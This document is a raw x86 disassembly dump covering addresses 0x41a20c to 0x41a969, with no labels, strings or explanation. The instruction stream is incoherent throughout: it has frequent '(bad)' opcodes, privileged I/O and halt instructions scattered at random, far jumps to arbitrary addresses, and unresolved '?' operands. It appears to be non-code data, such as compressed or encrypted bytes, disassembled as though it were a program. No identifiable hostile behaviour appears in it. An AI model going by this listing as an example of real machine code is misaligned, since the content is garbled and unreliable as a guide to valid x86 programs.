  41a20c:	jg     0x41a20c
  41a20e:	(bad)  
  41a20f:	in     eax,dx
  41a210:	(bad)  
  41a211:	xor    edx,edx
  41a213:	xor    DWORD PTR [edi+0x7b0a42e1],0xb9067403
  41a21d:	fisttp DWORD PTR [edi+0x28872508]
  41a223:	mov    esp,0xbb17d9fd
  41a228:	lods   eax,DWORD PTR ds:[esi]
  41a229:	mov    bh,0x7
  41a22b:	add    eax,eax
  41a22d:	inc    ebp
  41a22e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a22f:	cmp    bl,cl
  41a231:	jge    0x41a1e9
  41a233:	hlt    
  41a234:	pop    ds
  41a235:	jg     0x41a208
  41a237:	xchg   edx,eax
  41a238:	dec    ecx
  41a239:	add    al,0x47
  41a23b:	mov    DWORD PTR [eax],ebp
  41a23d:	leave  
  41a23e:	ins    DWORD PTR es:[edi],dx
  41a23f:	mov    ah,0xee
  41a241:	jbe    0x41a24a
  41a243:	jb     0x41a278
  41a245:	jg     0x41a234
  41a247:	ds pop ebp
  41a249:	into   
  41a24a:	pop    edx
  41a24b:	inc    edx
  41a24c:	mov    esp,0xbef38ad8
  41a251:	scas   eax,DWORD PTR es:[edi]
  41a252:	mov    dh,0x6a
  41a254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a255:	jmp    0x244a1037
  41a25a:	test   al,0xf
  41a25c:	adc    esi,DWORD PTR [ecx-0x7f391683]
  41a262:	in     al,0x83
  41a264:	dec    ecx
  41a265:	mov    esi,0x9ea8995a
  41a26a:	ret    
  41a26b:	push   edx
  41a26c:	xchg   ebx,eax
  41a26d:	pop    ss
  41a26e:	dec    ecx
  41a26f:	jmp    0x41a204
  41a271:	jle    0x41a2e9
  41a273:	call   0x5863976e
  41a278:	imul   esi,DWORD PTR [esi-0x4e],0xbaddcbc1
  41a27f:	rol    DWORD PTR [esi-0x56],0xde
  41a283:	in     al,0xc2
  41a285:	add    DWORD PTR [edx],0xbb311963
  41a28b:	les    esi,FWORD PTR [ebx-0x4a91f5a7]
  41a291:	jl     0x41a289
  41a293:	loope  0x41a2b0
  41a295:	dec    esi
  41a296:	retf   0x6546
  41a299:	inc    ebx
  41a29a:	sbb    BYTE PTR [ebx-0x4629ce23],al
  41a2a0:	dec    ebx
  41a2a1:	add    BYTE PTR [ecx-0x137bbcf6],ah
  41a2a7:	call   0xa3c3:0x32ffc41c
  41a2ae:	jecxz  0x41a2bc
  41a2b0:	(bad)  
  41a2b1:	pop    esp
  41a2b2:	xchg   edx,eax
  41a2b3:	je     0x41a2e5
  41a2b5:	fsubr  QWORD PTR [edi]
  41a2b7:	inc    ebx
  41a2b8:	sbb    bl,BYTE PTR ds:[eax]
  41a2bb:	iret   
  41a2bc:	or     bh,BYTE PTR [edi-0x13bd8eca]
  41a2c2:	pop    ds
  41a2c3:	dec    ecx
  41a2c4:	add    ebp,eax
  41a2c6:	out    0xb7,eax
  41a2c8:	mov    ch,BYTE PTR [ecx+0x54dbf16a]
  41a2ce:	cmp    al,BYTE PTR [edx]
  41a2d0:	rcr    edx,0xd3
  41a2d3:	pop    ss
  41a2d4:	jne    0x41a2f3
  41a2d6:	sub    ecx,DWORD PTR [esi]
  41a2d8:	arpl   WORD PTR [ebx],sp
  41a2da:	inc    edx
  41a2db:	dec    ebp
  41a2dc:	inc    edi
  41a2dd:	lods   al,BYTE PTR ds:[esi]
  41a2de:	js     0x41a2df
  41a2e0:	rcr    BYTE PTR [edi-0x52],1
  41a2e3:	je     0x41a268
  41a2e5:	and    al,0xf2
  41a2e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2e8:	push   edi
  41a2e9:	loop   0x41a31f
  41a2eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2ec:	pusha  
  41a2ed:	rol    ah,1
  41a2ef:	jae    0x41a2e7
  41a2f1:	jecxz  0x41a29d
  41a2f3:	and    BYTE PTR [ebp-0x7d],ch
  41a2f6:	dec    edi
  41a2f7:	xor    al,al
  41a2f9:	ds hlt 
  41a2fb:	pop    ds
  41a2fc:	push   ds
  41a2fd:	neg    BYTE PTR [edx+0x3865ff32]
  41a303:	sahf   
  41a304:	and    BYTE PTR [edi],bh
  41a306:	int    0x7c
  41a308:	retf   0x2ff9
  41a30b:	div    esp
  41a30d:	test   eax,0xc7e651cc
  41a312:	or     DWORD PTR [ebx+0x5d52af3c],0xffffffd6
  41a319:	push   es
  41a31a:	pop    edx
  41a31b:	mov    ch,0x87
  41a31d:	pop    ecx
  41a31e:	mov    edx,0xde9b5af5
  41a323:	loop   0x41a377
  41a325:	mov    BYTE PTR [esi],ch
  41a327:	pop    ss
  41a328:	mov    edx,DWORD PTR [esi]
  41a32a:	nop
  41a32b:	fld    DWORD PTR [ebp+0x517c1360]
  41a331:	inc    edi
  41a332:	xlat   BYTE PTR ds:[ebx]
  41a333:	push   eax
  41a334:	jne    0x41a30d
  41a336:	inc    ecx
  41a337:	mov    eax,0xf59d03e5
  41a33c:	mov    bl,0xdb
  41a33e:	ss inc ebp
  41a340:	push   ebp
  41a341:	jle    0x41a373
  41a343:	and    eax,0x86683f19
  41a348:	push   eax
  41a349:	ret    
  41a34a:	(bad)  
  41a34b:	cmp    al,0xbd
  41a34d:	loope  0x41a2ee
  41a34f:	xchg   esi,eax
  41a350:	add    edx,DWORD PTR [edx+0x4aa1c1d7]
  41a356:	stc    
  41a357:	les    ebx,FWORD PTR [edx+0x33]
  41a35a:	scas   eax,DWORD PTR es:[edi]
  41a35b:	ficomp WORD PTR [ebp+esi*4-0x767f82a6]
  41a362:	ficomp DWORD PTR [edi+ecx*8+0x43]
  41a366:	add    al,0xe5
  41a368:	jmp    0x163898fa
  41a36d:	sub    al,0x48
  41a36f:	and    DWORD PTR [eax+0x52],0xe4e90631
  41a376:	jg     0x41a330
  41a378:	dec    ebx
  41a379:	aas    
  41a37a:	shl    BYTE PTR [esi+0x21ba3cdc],cl
  41a380:	test   edx,ebx
  41a382:	cmp    DWORD PTR [edx+edx*4],edi
  41a385:	stos   DWORD PTR es:[edi],eax
  41a386:	mov    ebp,0xf9a0528a
  41a38b:	cli    
  41a38c:	pop    ss
  41a38d:	stos   BYTE PTR es:[edi],al
  41a38e:	pushf  
  41a38f:	or     eax,0x86a22edc
  41a394:	mov    al,ds:0xfcfbd740
  41a399:	int3   
  41a39a:	cwde   
  41a39b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a39c:	aad    0x1d
  41a39e:	mov    al,ds:0x86eacfce
  41a3a3:	fwait
  41a3a4:	call   DWORD PTR [edx+0xbf8b851]
  41a3aa:	or     al,bl
  41a3ac:	or     edi,ebx
  41a3ae:	in     al,dx
  41a3af:	push   cs
  41a3b0:	nop
  41a3b1:	jmp    0xbd78538f
  41a3b6:	mov    eax,ds:0x50277cdf
  41a3bb:	ss scas al,BYTE PTR es:[edi]
  41a3bd:	hlt    
  41a3be:	sub    BYTE PTR [esi],ah
  41a3c0:	(bad)  
  41a3c1:	ja     0x41a429
  41a3c3:	fsub   DWORD PTR [ecx+0x1fa7f1ae]
  41a3c9:	mov    eax,ds:0x7980456
  41a3ce:	jmp    0x41a400
  41a3d0:	adc    ebx,DWORD PTR [esi]
  41a3d2:	and    al,0xc4
  41a3d4:	dec    esi
  41a3d5:	test   al,0xff
  41a3d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3d8:	ds xchg ecx,eax
  41a3da:	icebp  
  41a3db:	mov    ch,0x39
  41a3dd:	mov    ebx,0x12b9a98f
  41a3e2:	mov    ?,WORD PTR ds:0x62d1adf7
  41a3e8:	and    al,0x9e
  41a3ea:	sub    eax,0x849074d2
  41a3ef:	xchg   esp,eax
  41a3f0:	test   DWORD PTR [edx-0x41fe9fac],ecx
  41a3f6:	daa    
  41a3f7:	xor    eax,0x6516280c
  41a3fc:	inc    edx
  41a3fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3fe:	cmovl  ebx,DWORD PTR [ebx+0x11e1e710]
  41a405:	bound  esi,QWORD PTR [ebp-0x6b]
  41a408:	loopne 0x41a3c8
  41a40a:	mov    al,BYTE PTR [edx-0x15]
  41a40d:	fsub   DWORD PTR [edx-0x1533c464]
  41a413:	sar    DWORD PTR [esi-0x7e],cl
  41a416:	adc    al,0x42
  41a418:	arpl   WORD PTR [edx],dx
  41a41a:	pop    esp
  41a41b:	inc    esp
  41a41c:	push   0xffffffba
  41a41e:	pop    ds
  41a41f:	imul   ebp,edx,0xffffffe1
  41a422:	sti    
  41a423:	push   ss
  41a424:	mov    dh,0xba
  41a426:	sbb    BYTE PTR [edx+0x60],al
  41a429:	js     0x41a471
  41a42b:	jmp    0x29e5:0x908c643d
  41a432:	fs cs fdivp st(3),st
  41a436:	mov    ecx,0xa9e4c413
  41a43b:	js     0x41a407
  41a43d:	repnz out 0x8d,al
  41a440:	sbb    ebx,0xd6219bee
  41a446:	cmp    esp,edi
  41a448:	sti    
  41a449:	sbb    DWORD PTR [esi],eax
  41a44b:	fistp  QWORD PTR [ecx+0x77bfefd7]
  41a451:	jl     0x41a48c
  41a453:	iret   
  41a454:	jmp    0xfc49:0xc89a4434
  41a45b:	inc    esp
  41a45c:	or     edi,ecx
  41a45e:	or     eax,0xee1f9d8f
  41a463:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a464:	xchg   ecx,eax
  41a465:	fcomi  st,st(2)
  41a467:	jbe    0x41a41d
  41a469:	and    eax,0xd06ff21c
  41a46e:	(bad)  [ebx]
  41a470:	dec    ebx
  41a471:	sbb    BYTE PTR ds:[eax-0x59],0x92
  41a476:	add    dl,BYTE PTR [ebp+0x14]
  41a479:	imul   DWORD PTR [edx-0x19372d39]
  41a47f:	fbld   TBYTE PTR [ecx+ebx*2-0x2c095398]
  41a486:	mov    ch,0x83
  41a488:	(bad)  
  41a489:	cmc    
  41a48a:	inc    ebx
  41a48b:	and    al,0x91
  41a48d:	scas   al,BYTE PTR es:[edi]
  41a48e:	leave  
  41a48f:	sbb    BYTE PTR [esi],bh
  41a491:	adc    eax,0x6ebeb3c6
  41a496:	les    esp,FWORD PTR [eax+ebp*2-0x799e1cc0]
  41a49d:	ss mov edx,0x5641fffc
  41a4a3:	imul   edi,DWORD PTR [esi],0x5e15b72c
  41a4a9:	(bad)  
  41a4aa:	mov    eax,0x3850cccd
  41a4af:	jmp    0x6c5:0xfc6d9c3a
  41a4b6:	cld    
  41a4b7:	inc    eax
  41a4b8:	jbe    0x41a4b1
  41a4ba:	daa    
  41a4bb:	dec    ecx
  41a4bc:	or     al,0x8c
  41a4be:	pop    eax
  41a4bf:	or     al,0x27
  41a4c2:	(bad)  
  41a4c3:	pop    ds
  41a4c4:	fild   WORD PTR [eax]
  41a4c6:	lods   eax,DWORD PTR ds:[esi]
  41a4c7:	test   BYTE PTR [edi-0x55b79a2a],ah
  41a4cd:	jp     0x41a4ac
  41a4cf:	pop    ebp
  41a4d0:	ffree  st(3)
  41a4d2:	jmp    0x35cc866
  41a4d7:	jae    0x41a4b0
  41a4d9:	sbb    esi,edx
  41a4db:	xchg   ebx,eax
  41a4dc:	stos   DWORD PTR es:[edi],eax
  41a4dd:	mov    cl,BYTE PTR [esi-0x2a7a731]
  41a4e3:	sbb    DWORD PTR [eax],edi
  41a4e5:	mov    ds,WORD PTR [esp+edi*8+0x1f331e6b]
  41a4ec:	clc    
  41a4ed:	retf   0x8182
  41a4f0:	aaa    
  41a4f1:	icebp  
  41a4f2:	mov    dh,0x8a
  41a4f4:	popw   ss
  41a4f6:	nop
  41a4f7:	jbe    0x41a501
  41a4f9:	or     BYTE PTR [ebx+eiz*8-0x55],ah
  41a4fd:	xchg   edx,eax
  41a4fe:	mov    bl,0x14
  41a500:	xchg   DWORD PTR [ebp+0x23],eax
  41a503:	dec    eax
  41a504:	js     0x41a53d
  41a506:	adc    bl,0x6
  41a509:	mov    bh,BYTE PTR [ebp+0x4d8b15e8]
  41a50f:	ss cs out dx,eax
  41a512:	ins    BYTE PTR es:[edi],dx
  41a513:	adc    eax,0x8b8d1fdd
  41a518:	in     eax,dx
  41a519:	arpl   WORD PTR [ebp-0x3a],bp
  41a51c:	icebp  
  41a51d:	pop    eax
  41a51e:	xchg   BYTE PTR [eax+0x2d0cf6de],al
  41a524:	(bad)  
  41a525:	adc    DWORD PTR [ebx],ebp
  41a527:	test   bh,bh
  41a529:	pop    ss
  41a52a:	in     eax,dx
  41a52b:	pop    ecx
  41a52c:	inc    esi
  41a52d:	xchg   ebp,eax
  41a52e:	out    dx,al
  41a52f:	add    al,0xa4
  41a531:	and    ah,bl
  41a533:	push   0xffffffd7
  41a535:	es retf 0x19f
  41a539:	mov    ah,0xec
  41a53b:	jp     0x41a4ee
  41a53d:	sahf   
  41a53e:	sub    eax,0x45db7d91
  41a543:	add    dl,0x35
  41a546:	imul   eax,ebp,0x2aa88841
  41a54c:	sbb    eax,0x40591de
  41a551:	mov    al,ds:0x80fe5338
  41a556:	loop   0x41a5d2
  41a558:	sub    eax,0x9d1a575d
  41a55d:	call   0x3d89:0xa7368d4b
  41a564:	pushf  
  41a565:	(bad)  
  41a567:	push   ebp
  41a568:	inc    eax
  41a569:	int3   
  41a56a:	and    eax,0xb626f15e
  41a56f:	imul   ecx,DWORD PTR [eax+0x17],0xffffffb1
  41a573:	test   eax,0x15e6059a
  41a578:	or     ecx,DWORD PTR [eax-0x4338ebc4]
  41a57e:	mov    edi,0xcb0c5a19
  41a583:	test   BYTE PTR [ecx+0x6d78fbb3],bh
  41a589:	lods   eax,DWORD PTR ds:[esi]
  41a58a:	cmp    al,0x8a
  41a58c:	mov    ebx,0x56b6608f
  41a591:	sub    eax,0x1cda1a75
  41a596:	(bad)  [eax+eax*4+0x5]
  41a59a:	shl    DWORD PTR [edx],cl
  41a59c:	dec    esp
  41a59d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a59e:	cmp    DWORD PTR [ebx+ebp*8],edx
  41a5a1:	mov    bh,0x87
  41a5a3:	sbb    BYTE PTR [ebp-0x4a],bh
  41a5a6:	clc    
  41a5a7:	push   ds
  41a5a8:	shl    edi,0xed
  41a5ab:	dec    ebx
  41a5ac:	mov    dh,dl
  41a5ae:	(bad)  
  41a5af:	sti    
  41a5b0:	xchg   BYTE PTR [ecx-0x35],bl
  41a5b3:	jl     0x41a598
  41a5b5:	jb     0x41a620
  41a5b7:	jbe    0x41a61d
  41a5b9:	mov    DWORD PTR [eax-0x77],esi
  41a5bc:	mov    ebp,0x77ba1d4d
  41a5c1:	lahf   
  41a5c2:	icebp  
  41a5c3:	sub    al,0xe7
  41a5c5:	loop   0x41a621
  41a5c7:	push   ebp
  41a5c8:	mov    ch,0x38
  41a5ca:	pop    esp
  41a5cb:	sti    
  41a5cc:	rcl    dh,1
  41a5ce:	mov    eax,ds:0x3e3fceab
  41a5d3:	icebp  
  41a5d4:	push   esi
  41a5d5:	push   0x15362f3d
  41a5da:	pushf  
  41a5db:	mov    esi,0x7153893d
  41a5e0:	sub    BYTE PTR [eax+0x7744f773],ch
  41a5e6:	retf   
  41a5e7:	push   edx
  41a5e8:	jge    0x41a5f9
  41a5ea:	push   0xfffffffb
  41a5ec:	pop    edi
  41a5ed:	jno    0x41a650
  41a5ef:	test   BYTE PTR ds:0xaddf5917,dl
  41a5f5:	in     eax,0x9
  41a5f7:	clc    
  41a5f8:	jne    0x41a5d8
  41a5fa:	cs adc eax,0x285e4f2e
  41a600:	xchg   edx,eax
  41a601:	push   0x914523e0
  41a606:	mov    ebx,ss
  41a608:	repnz mov esi,0xf2826b49
  41a60e:	push   es
  41a60f:	(bad)  
  41a610:	imul   DWORD PTR [ebx-0x622aa0af]
  41a616:	or     eax,0x767c937d
  41a61b:	sar    DWORD PTR [esi],0x21
  41a61e:	sahf   
  41a61f:	xor    esi,DWORD PTR [ebx]
  41a621:	pop    ecx
  41a622:	loop   0x41a631
  41a624:	loopne 0x41a688
  41a626:	ret    0x5194
  41a629:	sub    edx,0xa304c1ae
  41a62f:	ss popf 
  41a631:	dec    edx
  41a632:	lahf   
  41a633:	out    0xbe,eax
  41a635:	xor    al,BYTE PTR [ecx-0x451072c9]
  41a63b:	aaa    
  41a63c:	inc    ecx
  41a63d:	loop   0x41a5ce
  41a63f:	dec    edx
  41a640:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a641:	mov    cl,0x47
  41a643:	dec    esp
  41a644:	cmp    BYTE PTR [esi],dl
  41a646:	sar    DWORD PTR [edx],0x32
  41a649:	fisttp WORD PTR [edx+0x2c]
  41a64c:	fiadd  WORD PTR [ebx]
  41a64e:	jno    0x41a65a
  41a650:	sbb    al,0xb8
  41a653:	adc    DWORD PTR [edx],edx
  41a655:	(bad)  
  41a656:	mov    esi,0xe8773a59
  41a65b:	and    al,0x8f
  41a65d:	sub    al,BYTE PTR ds:0x7975421d
  41a663:	or     DWORD PTR [ebx-0x73ec95b8],ecx
  41a669:	dec    ebx
  41a66a:	loopne 0x41a6cf
  41a66c:	xor    BYTE PTR [ebx+ebx*4-0x7df82b7e],dl
  41a673:	fwait
  41a674:	pusha  
  41a675:	fwait
  41a676:	ins    DWORD PTR es:[edi],dx
  41a677:	popa   
  41a678:	mov    bl,dl
  41a67a:	shl    DWORD PTR [esi+0x5f],cl
  41a67d:	stos   DWORD PTR es:[edi],eax
  41a67e:	mov    ebx,0xecc1b9f2
  41a683:	icebp  
  41a684:	retf   
  41a685:	hlt    
  41a686:	adc    bh,BYTE PTR [edx+0x61]
  41a689:	sahf   
  41a68a:	test   cl,dh
  41a68c:	cmp    al,0x9e
  41a68e:	push   esi
  41a68f:	aad    0x8d
  41a691:	add    DWORD PTR [ebx+0x4fd5a170],esp
  41a697:	shr    ecx,1
  41a699:	cmp    DWORD PTR [edi-0xb],edx
  41a69c:	add    al,0x84
  41a69e:	fcom   st(1)
  41a6a0:	push   ecx
  41a6a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6a2:	stc    
  41a6a3:	cmc    
  41a6a4:	in     al,dx
  41a6a5:	jbe    0x41a6f5
  41a6a7:	dec    ebp
  41a6a8:	ins    DWORD PTR es:[edi],dx
  41a6a9:	test   al,0xfb
  41a6ab:	inc    ecx
  41a6ac:	(bad)  
  41a6ad:	adc    BYTE PTR [ebx+eax*8],bh
  41a6b0:	lahf   
  41a6b1:	dec    esi
  41a6b2:	pop    esi
  41a6b3:	iret   
  41a6b4:	scas   al,BYTE PTR es:[edi]
  41a6b5:	icebp  
  41a6b6:	shr    BYTE PTR [ebx+0x16],1
  41a6b9:	data16 and bh,ah
  41a6bc:	xchg   edx,eax
  41a6bd:	and    ebx,0xffffff85
  41a6c0:	mov    eax,ds:0xebbef34d
  41a6c5:	mov    al,0xd9
  41a6c7:	jl     0x41a651
  41a6c9:	mov    bh,0x33
  41a6cb:	fbld   TBYTE PTR [ecx+0x4]
  41a6ce:	out    dx,eax
  41a6cf:	addr16 jp 0x41a6ad
  41a6d2:	add    eax,0x5f8fc6f8
  41a6d7:	jno    0x41a6a2
  41a6d9:	push   ecx
  41a6da:	push   ss
  41a6db:	inc    esi
  41a6dc:	test   eax,0x2f0a854b
  41a6e1:	into   
  41a6e2:	aaa    
  41a6e3:	outs   dx,BYTE PTR ds:[esi]
  41a6e4:	xchg   edi,eax
  41a6e5:	push   ebx
  41a6e6:	mov    edx,DWORD PTR [esi]
  41a6e8:	mov    ebp,0xdfcdf1f4
  41a6ed:	jne    0x41a6c2
  41a6ef:	cmp    BYTE PTR [edi+0x67c7481c],ah
  41a6f5:	daa    
  41a6f6:	cli    
  41a6f7:	loop   0x41a718
  41a6f9:	add    eax,0xd2eec5e2
  41a6fe:	in     eax,0x16
  41a700:	push   cs
  41a701:	clc    
  41a702:	mov    ebp,DWORD PTR [edx+0x2828d95e]
  41a708:	push   cs
  41a709:	and    ebp,DWORD PTR [edx+edi*8-0x64]
  41a70d:	sbb    al,BYTE PTR ds:0x802b9fa1
  41a713:	xor    eax,DWORD PTR [edx-0x70e4aca5]
  41a719:	into   
  41a71a:	xor    bh,BYTE PTR [eax]
  41a71c:	stos   DWORD PTR es:[edi],eax
  41a71d:	addr16 ret 0x67b8
  41a721:	mov    cl,0x87
  41a723:	iret   
  41a724:	sti    
  41a725:	dec    esp
  41a726:	add    al,0xe6
  41a728:	retf   
  41a729:	dec    esi
  41a72a:	mov    ebx,DWORD PTR [ecx-0x6e10a5b8]
  41a730:	(bad)  
  41a731:	(bad)  
  41a732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a733:	leave  
  41a734:	sub    bl,BYTE PTR [edi]
  41a736:	(bad)  
  41a737:	retf   
  41a738:	loope  0x41a790
  41a73a:	push   esp
  41a73b:	adc    al,0xf2
  41a73d:	ja     0x41a7be
  41a73f:	dec    ebp
  41a740:	jmp    0x8679:0xb8b122cc
  41a747:	inc    ecx
  41a748:	xchg   edi,eax
  41a749:	push   0xaea30eff
  41a74e:	ret    
  41a74f:	jecxz  0x41a7bc
  41a751:	mov    esi,0x4f6c28c0
  41a756:	push   0xffffffd3
  41a758:	cmp    eax,0xac7a3504
  41a75d:	lea    edi,[ecx]
  41a75f:	add    dl,bl
  41a761:	mov    esp,0xfaba8113
  41a766:	jle    0x41a7a9
  41a768:	or     dh,dh
  41a76a:	fs cwde 
  41a76c:	cld    
  41a76d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a76e:	scas   al,BYTE PTR es:[edi]
  41a76f:	fstp   st(2)
  41a771:	das    
  41a772:	loopne 0x41a706
  41a774:	mov    dl,0x1a
  41a776:	mov    dl,0x26
  41a778:	pop    ebx
  41a779:	push   ebp
  41a77a:	mov    ds:0x35fcde1b,eax
  41a77f:	retf   0x2f9b
  41a782:	cmp    cl,cl
  41a784:	fcmovu st,st(1)
  41a786:	push   edi
  41a787:	retf   
  41a788:	gs dec edx
  41a78a:	inc    ecx
  41a78b:	push   ebx
  41a78c:	push   eax
  41a78d:	inc    ebx
  41a78e:	lea    esi,es:[ebx+eiz*8-0x4f7cf8ae]
  41a796:	test   BYTE PTR [eax-0x4e7a2d98],dl
  41a79c:	(bad)  
  41a79d:	or     bh,cl
  41a79f:	mov    DWORD PTR [ecx+0x65],edi
  41a7a2:	aaa    
  41a7a3:	dec    edx
  41a7a4:	cdq    
  41a7a5:	lock jl 0x41a75a
  41a7a8:	jle    0x41a826
  41a7aa:	jbe    0x41a775
  41a7ac:	pushf  
  41a7ad:	dec    eax
  41a7ae:	xchg   dh,bl
  41a7b0:	pop    edx
  41a7b1:	popa   
  41a7b2:	jge    0x41a794
  41a7b4:	(bad)  
  41a7b5:	fisubr WORD PTR fs:[ecx-0x45fb647a]
  41a7bc:	jb     0x41a779
  41a7be:	ins    BYTE PTR es:[edi],dx
  41a7bf:	(bad)  
  41a7c2:	sahf   
  41a7c3:	cld    
  41a7c4:	pushf  
  41a7c5:	dec    edx
  41a7c6:	fld    DWORD PTR [ebx+0x4a]
  41a7c9:	sub    ah,BYTE PTR [edi+ebp*1+0x617f6651]
  41a7d0:	addr16 int 0xf7
  41a7d3:	out    dx,eax
  41a7d4:	xor    eax,0xf7c31cba
  41a7d9:	pop    ebp
  41a7da:	fadd   QWORD PTR [ebx]
  41a7dc:	jno    0x41a7b1
  41a7de:	push   ss
  41a7df:	int3   
  41a7e0:	xchg   edi,eax
  41a7e1:	std    
  41a7e2:	daa    
  41a7e3:	fstp   st(2)
  41a7e5:	dec    edx
  41a7e6:	cwde   
  41a7e7:	sbb    al,0xcd
  41a7e9:	das    
  41a7ea:	shl    BYTE PTR [edx+0x3668e40e],cl
  41a7f0:	dec    eax
  41a7f1:	mov    dh,0x97
  41a7f3:	sub    ebp,DWORD PTR [esp+eax*8]
  41a7f6:	inc    esp
  41a7f7:	cwde   
  41a7f8:	jae    0x41a7d4
  41a7fa:	dec    ebx
  41a7fb:	mov    DWORD PTR [edi+0x313a7976],edi
  41a801:	jmp    DWORD PTR [edi]
  41a803:	popf   
  41a804:	mov    eax,0x8626a055
  41a809:	and    bl,BYTE PTR fs:0x2dcd9377
  41a810:	data16 aas 
  41a812:	adc    DWORD PTR [ecx+0x6901eb7a],esi
  41a818:	inc    ebp
  41a819:	fwait
  41a81a:	nop
  41a81b:	push   0xffffff8b
  41a81d:	ds call 0x837af0bc
  41a823:	and    eax,0xa734ad3a
  41a828:	add    al,BYTE PTR [ebx+0x1a]
  41a82b:	mov    eax,0x71da6407
  41a830:	mov    edi,0xd292cb48
  41a835:	and    BYTE PTR [edx],bl
  41a837:	sti    
  41a838:	add    eax,0x869f0c9b
  41a83d:	xlat   BYTE PTR ds:[ebx]
  41a83e:	sub    ah,BYTE PTR [ebx-0x63544c0]
  41a844:	je     0x41a7df
  41a846:	cmp    DWORD PTR [ecx],ebp
  41a848:	cmp    eax,0x833be613
  41a84d:	(bad)  
  41a84e:	dec    eax
  41a84f:	(bad)  
  41a850:	and    eax,ebp
  41a852:	cs aas 
  41a854:	jns    0x41a86f
  41a856:	mov    edi,DWORD PTR [ebp+0x2abcc7bf]
  41a85c:	jge    0x41a876
  41a85e:	and    al,0x85
  41a860:	sbb    DWORD PTR [edi+0x4ba29503],esi
  41a866:	mov    esp,?
  41a868:	sbb    al,0x9c
  41a86a:	push   0xffffffb0
  41a86c:	sub    BYTE PTR [ecx-0x2b0cf523],bl
  41a872:	jno    0x41a890
  41a874:	push   0x49553c73
  41a879:	mov    dh,0x8
  41a87b:	mov    dh,0x83
  41a87d:	jns    0x41a8d4
  41a87f:	mov    bh,0x77
  41a881:	jae    0x41a8aa
  41a883:	or     BYTE PTR [edi-0x6a],ch
  41a886:	add    DWORD PTR [ebp+0xcec2252],edx
  41a88c:	out    dx,al
  41a88d:	mov    edi,0x42d3bdc
  41a892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a893:	cmp    al,0x6d
  41a895:	ds mov ebx,0xb74d838c
  41a89b:	jmp    0x3c6a:0x5d112ba4
  41a8a2:	xchg   ebx,eax
  41a8a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8a4:	cmp    DWORD PTR [ebx],ebx
  41a8a6:	stos   BYTE PTR es:[edi],al
  41a8a7:	jae    0x41a87e
  41a8a9:	lods   eax,DWORD PTR ds:[esi]
  41a8aa:	add    DWORD PTR [ebx],0x3a
  41a8ad:	cmc    
  41a8ae:	pop    ebx
  41a8af:	or     eax,0xb33ca032
  41a8b4:	push   ss
  41a8b5:	fmul   DWORD PTR [ebp+0x1c96beef]
  41a8bb:	jle    0x41a854
  41a8bd:	pop    es
  41a8be:	xor    eax,ebp
  41a8c0:	xchg   edi,eax
  41a8c1:	mov    ebp,0xcc73a0a3
  41a8c6:	int    0xd1
  41a8c8:	push   ds
  41a8c9:	xchg   esp,edx
  41a8cb:	adc    DWORD PTR [ecx+edx*4-0x4a],eax
  41a8cf:	(bad)  
  41a8d0:	scas   eax,DWORD PTR es:[edi]
  41a8d1:	xchg   ebp,eax
  41a8d2:	int    0x2a
  41a8d4:	das    
  41a8d5:	clc    
  41a8d6:	jl     0x41a885
  41a8d8:	inc    ebp
  41a8d9:	imul   ebp,DWORD PTR [ecx-0x188459ac],0xffffffba
  41a8e0:	ror    edi,cl
  41a8e2:	adc    BYTE PTR [eax+0x49],al
  41a8e5:	inc    edx
  41a8e6:	sti    
  41a8e7:	jmp    0x6cc1ae33
  41a8ec:	cmp    al,0xb6
  41a8ee:	sub    esp,DWORD PTR [esi-0x6a86eb2c]
  41a8f4:	es and eax,0x1082c2a3
  41a8fa:	nop
  41a8fb:	test   BYTE PTR [esi-0x2a],bh
  41a8fe:	dec    eax
  41a8ff:	sbb    bl,BYTE PTR [esi-0x4ed6a8c6]
  41a905:	jmp    FWORD PTR [edx-0x4f]
  41a908:	stc    
  41a909:	out    0xc8,eax
  41a90b:	sahf   
  41a90c:	pop    ebx
  41a90d:	jns    0x41a95e
  41a90f:	pop    ebx
  41a910:	inc    esi
  41a911:	loopne 0x41a93b
  41a913:	cmp    ch,bh
  41a915:	add    BYTE PTR [eax],bh
  41a917:	mov    edx,0x5db83f33
  41a91c:	xchg   ebx,eax
  41a91d:	sbb    dh,al
  41a91f:	push   ecx
  41a920:	or     esp,esi
  41a922:	popa   
  41a923:	fmul   st,st(6)
  41a925:	pop    ecx
  41a926:	or     eax,DWORD PTR [edx-0x7b]
  41a929:	xchg   edi,edi
  41a92b:	test   BYTE PTR [eax-0x42],al
  41a92e:	and    edx,DWORD PTR [eax+esi*4]
  41a931:	inc    ecx
  41a932:	cmp    eax,0x5091e200
  41a937:	imul   eax,DWORD PTR [edi-0x1f],0x32
  41a93b:	mov    esi,ss
  41a93d:	inc    esp
  41a93e:	ja     0x41a9b9
  41a940:	jb     0x41a945
  41a942:	jl     0x41a8ef
  41a944:	ins    BYTE PTR es:[edi],dx
  41a945:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a946:	outs   dx,BYTE PTR ds:[esi]
  41a947:	or     eax,0xbe3870e2
  41a94c:	jb     0x41a94a
  41a94e:	ins    DWORD PTR es:[edi],dx
  41a94f:	xchg   ecx,eax
  41a950:	push   ebx
  41a951:	cld    
  41a952:	dec    edi
  41a953:	hlt    
  41a954:	mov    esi,0x6b4b6ec2
  41a959:	js     0x41a8e6
  41a95b:	ret    
  41a95c:	aam    0x83
  41a95e:	test   BYTE PTR [edi+0x32],bh
  41a961:	sbb    DWORD PTR [eax],eax
  41a963:	ds stc 
  41a965:	xlat   BYTE PTR ds:[ebx]
  41a966:	or     al,dh
  41a968:	cld    
  41a969:	inc    ecx
